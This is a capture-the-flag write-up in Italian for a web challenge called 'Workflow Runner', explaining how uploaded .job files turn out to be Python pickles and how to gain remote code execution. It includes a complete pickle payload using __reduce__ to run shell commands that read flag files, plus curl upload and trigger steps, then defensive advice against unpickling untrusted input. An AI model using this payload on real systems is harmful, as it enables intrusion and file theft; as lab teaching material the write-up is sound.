# Workflow Runner

**Competizione:** ITSCyberGame <br>
**Categoria:** Web <br>
**Servizio:** `sfide.itscybergame.it:<port_number>`

---

## Descrizione
> "Qui i ""job"" possono ""runnare"" senza alcun problema, sempre che siano conformi al formato che voglio IO. Hai qualcosa in contrario? Vediamo cosa sei capace di fare"

Un pannello interno per caricare ed eseguire "workflow aziendali" in formato `.job`. È possibile scaricare un file di esempio e caricare i propri. La descrizione cita esplicitamente un "**serializzatore Python interno**".

---

## Soluzione

### 1. Ricognizione iniziale

```bash
curl -s http://sfide.itscybergame.it:<port_number>/
```

La homepage espone:
- `GET /sample`: scarica un workflow di esempio
- `POST /upload`: carica un file `.job`
- `GET /run/{id}`: esegue un job caricato

```bash
curl -s http://sfide.itscybergame.it:<port_number>/sample -o sample.job
file sample.job
# sample.job: data
```

### 2. Analisi del formato .job — Insecure Deserialization

Il file è binario. Analisi dei magic bytes:

```python
data = open('sample.job', 'rb').read()
print(repr(data[:10]))
# b'\x80\x04\x95\x8f\x00\x00\x00\x00\x00\x00\x00'
```

`\x80\x04` = **opcode pickle protocol 4**. Il file è un oggetto Python serializzato con `pickle.dumps()`.

```python
import pickle
obj = pickle.loads(data)
print(obj)
# {'workflow': 'demo-report', 'version': 1,
#  'steps': ['load_csv', 'normalize_columns', 'export_summary'],
#  'owner': 'team-automazioni', 'status': 'ok'}
```

Il server esegue `pickle.loads()` sul file caricato senza alcuna validazione. `pickle` è intrinsecamente unsafe: il metodo `__reduce__` di una classe viene eseguito durante la deserializzazione, consentendo **RCE** (Remote Code Execution).

### 3. Comprensione del flow upload/run

Caricando un job legittimo si scopre che:
- `POST /upload` salva il file e ritorna redirect a `/`
- La homepage mostra i job caricati con un link **"Esegui"** → `GET /run/{id}`
- È `/run/{id}` che chiama `pickle.loads()` e mostra il valore di ritorno nella pagina

```html
<a class="button" href="/run/02d4b8d57f744c048ac154aac301d548">Esegui</a>
```

### 4. Exploit — Pickle RCE

Costruiamo un payload che sfrutta `__reduce__` per eseguire un comando shell e restituirne l'output come valore di ritorno del job:

```python
import pickle, subprocess

class Exploit(object):
    def __reduce__(self):
        cmd = (
            "cat /flag* /home/*/flag* /root/flag* /app/flag* 2>/dev/null"
        )
        return (subprocess.check_output, (['/bin/sh', '-c', cmd],))

payload = pickle.dumps(Exploit())
open('exploit.job', 'wb').write(payload)
```

`subprocess.check_output` viene chiamato con la nostra shell command durante il `pickle.loads()` lato server. Il valore di ritorno (stdout del comando) viene catturato e mostrato nella pagina `/run/{id}`.

#### Upload

```bash
curl -s -X POST http://sfide.itscybergame.it:<port_number>/upload \
  -F "job_file=@exploit.job;filename=exploit.job"
# → redirect a /
```

#### Recupero ID ed esecuzione

```bash
curl -s http://sfide.itscybergame.it:<port_number>/ | grep "Esegui"
# <a class="button" href="/run/02d4b8d57f744c048ac154aac301d548">Esegui</a>

curl -s http://sfide.itscybergame.it:<port_number>/run/02d4b8d57f744c048ac154aac301d548
```

#### Risposta del server

```html
<pre class="result-box">b'flag{...}\n'</pre>
```

---

## Flag

```
flag{...}
```

---

## Conclusioni

| Step | Dettaglio |
|------|-----------|
| **Discovery** | `/sample` rivela il formato `.job` = pickle serializzato |
| **Vuln** | `pickle.loads()` su input utente → RCE via `__reduce__` |
| **Trick** | Il job non viene eseguito all'upload ma solo su `GET /run/{id}` |
| **Exfil** | `subprocess.check_output` restituisce stdout come return value, mostrato nella pagina |


- `pickle` non è un formato di serializzazione sicuro per dati untrusted: non esiste modo di "sanificare" un pickle malevolo senza eseguirlo. Usare `json`, `msgpack` o `jsonschema`-validated YAML per input utente.
- La validazione dell'estensione (`.job`) non offre alcuna protezione: il contenuto binario è ciò che conta.
- Il pattern upload → esecuzione differita non mitiga il rischio: la deserializzazione è il punto vulnerabile, indipendentemente dal momento in cui avviene.